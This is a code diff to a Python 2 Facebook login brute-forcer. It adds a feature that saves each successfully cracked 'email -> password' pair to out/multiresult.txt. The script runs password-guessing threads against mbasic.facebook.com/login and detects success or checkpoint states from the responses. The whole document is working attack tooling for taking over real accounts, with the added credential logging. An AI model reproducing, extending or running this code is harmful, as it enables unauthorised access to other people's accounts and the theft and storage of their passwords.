@@ -8,7 +8,7 @@
  Rebuild Copyright Can't make u real programmer:)
 '''
 
-
+import os
 import re
 import sys
 import bs4
@@ -30,7 +30,20 @@ threads = []
 _found = []
 _cekpoin = []
 url="https://mbasic.facebook.com/login"
+filez=""
 
+if os.path.exists("out"):
+	if os.path.exists("out/multiresult.txt"):
+		if os.path.getsize("out/multiresult.txt") !=0:
+			filez=open("out/multiresult.txt","a")
+		else:
+			filez=open("out/multiresult.txt","w").close()
+	else:
+		filez=open("out/multiresult.txt","w").close()
+else:
+	os.mkdir("out")
+	filez=open("out/multiresult.txt","w").close()
+	
 class asuBrute(threading.Thread):
 	def __init__(self,*args):
 		threading.Thread.__init__(self)
@@ -56,6 +69,8 @@ class asuBrute(threading.Thread):
 				self._pasw)
 				_found.append(" | %s -> %s"%(self._email,
 				self._pasw))
+				open("out/multiresult.txt","a").write(
+					"%s -> %s\n"%(self._email,self._pasw))
 			if "checkpoint" in self._req:
 				_cekpoin.append(" - %s - %s"%(self._email,
 				self._pasw))
@@ -90,6 +105,7 @@ class _prepares:
 		
 	def _openFile(self):
 		self.Files = open(self._words).read().splitlines()
+		print "[%s*%s] Result account found saved to out/multiresult.txt"%(G,N)
 		self._generarePasswd()
 
 	def _run(self):
@@ -144,6 +160,7 @@ class thread:
 		).url
 		if "save-device" in r or "m_sess" in r:
 			fo.append("%s -> %s"%(id,ps))
+			open("out/multiresult.txt","a").write("%s -> %s\n"%(id.replace("\n",""),ps))
 		if "checkpoint" in r:
 			cp.append("%s -> %s"%(id,ps))
 		else:
@@ -168,6 +185,7 @@ class prepare:
 				if "login" in x["name"]:
 					sb=x["value"]
 			ps=raw_input("[%s#%s] Password to crack: "%(G,N))
+			print "[%s*%s] Result account found saved to out/multiresult.txt"%(G,N)
 		except Exception as f:
 			print("%s[!]%s %s"%(R,N,f))
 			return self.tg()
